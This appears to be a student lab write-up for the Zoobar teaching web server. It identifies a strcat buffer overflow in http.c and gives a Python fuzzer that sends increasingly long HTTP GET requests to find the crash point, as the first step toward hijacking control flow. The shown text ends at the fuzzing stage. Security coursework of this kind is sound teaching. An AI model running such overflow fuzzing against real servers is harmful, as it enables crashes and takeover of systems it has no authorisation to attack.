# Zoobar: Exploit 1

Antti Ollila
Niklas SÃ¤rokaari

## Vulnerability

    [http.c:276] The program allocates 1024 bytes for a variable 'pn'. 
    Then it uses the vulnerable 'strcat' function to append a string 
    from 'pn' to 'name' variable.
    
## Exploit
Our goal is to find out a request that could crash the server and
after that, to exploit it further to gain control of the control flow.

The server does pretty good job filtering any non-HTTP requests out,
so we have to have the default HTTP-query included in the exploit:

    GET / HTTP/1.1\r\nHost: "+ HOSTNAME + "\r\nConnection: Close\r\n\r\n"
    
The command above just gets the index page and does nothing else.

Next step were to find out how much data can the server handle including
the HTTP-request. We did this by using a python script to generate HTTP-requests
of increasing length:

    # Fuzzed HTTP Requests trying to find
    # the maximum size that the server
    # can handle
    
    import sys, socket, time
    
    # Use in the form "python httpfuzz.py host port"
    
    host = sys.argv[1] # Recieve IP from user
    port = int(sys.argv[2]) # Recieve Port from user
    
    length = 100 # Initial length of 100 A's
    
    while (length < 3000): # Stop once we've tried up to 3000 length
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Declare a TCP socket
        client.connect((host, port)) # Connect to user supplied port and IP address
    
        command = "GET /" +  length * "A" + " HTTP/1.1\r\nHost: "+ host + "\r\nConnection: Close\r\n\r\n"
        client.send(command) # Send the user command with a variable length name
        data = client.recv(1024) # Recieve Reply
        client.close() # Close the Connection
        time.sleep(2)
        print "Length Sent: " + str(length) # Output length of the request
        length += 100 # Try again with an increased length

